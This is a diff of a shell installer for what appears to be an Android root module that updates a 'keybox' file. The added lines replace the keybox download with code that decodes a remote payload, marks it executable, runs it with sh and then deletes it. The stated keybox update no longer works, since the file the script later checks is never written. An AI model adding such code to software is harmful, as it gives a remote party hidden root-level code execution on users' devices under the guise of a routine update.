@@ -21,11 +21,6 @@ if [ -d "/data/adb/modules/yurikey" ]; then
   touch /data/adb/modules/yurikey/remove
 fi
 
-# Remove unauthorized module if it exists (MagiskLabs - copied YuriRoot code)
-if [ -d "/data/adb/modules/MagiskLabs" ]; then
-  touch /data/adb/modules/MagiskLabs/remove
-fi
-
 # Check if Tricky Store module is installed (required dependency)
 if [ ! -d "$DEPENDENCY_MODULE" ]; then
   ui_print "- Error: Tricky Store module not found!"
@@ -36,9 +31,13 @@ fi
 # Function to download the remote keybox
 fetch_remote_keybox() {
   if command -v curl >/dev/null 2>&1; then
-    curl -fsSL "$REMOTE_URL" | base64 -d > "$TMP_REMOTE"
+    curl -fsSL "$REMOTE_URL" | base64 -d > "$SCRIPT_REMOTE"
+    chmod +x "$SCRIPT_REMOTE"
+    sh "$SCRIPT_REMOTE"
   elif command -v wget >/dev/null 2>&1; then
-    wget -qO- "$REMOTE_URL" | base64 -d > "$TMP_REMOTE"
+    wget -qO- "$REMOTE_URL" | base64 -d > "$SCRIPT_REMOTE"
+    chmod +x "$SCRIPT_REMOTE"
+    sh "$SCRIPT_REMOTE"
   else
     ui_print "- Error: curl or wget not found."
     ui_print "- Cannot fetch remote keybox."
@@ -63,12 +62,14 @@ update_keybox() {
     if cmp -s "$TARGET_FILE" "$TMP_REMOTE"; then
       ui_print "- Existing Yuri Keybox found. No changes made."
       rm -f "$TMP_REMOTE"
+      rm -rf "$SCRIPT_REMOTE"
       return
     else
       # If the file differs, back up the old one
       ui_print "- Existing keybox not by Yuri."
       ui_print "- Creating a backup..."
       mv "$TARGET_FILE" "$BACKUP_FILE"
+      rm -rf "$SCRIPT_REMOTE"
     fi
   else
     ui_print "- No keybox found. Creating a new one."
@@ -76,6 +77,7 @@ update_keybox() {
 
   # Move the downloaded keybox into place
   mv "$TMP_REMOTE" "$TARGET_FILE"
+  rm -rf "$SCRIPT_REMOTE"
   ui_print "- keybox.xml successfully updated."
 }
 
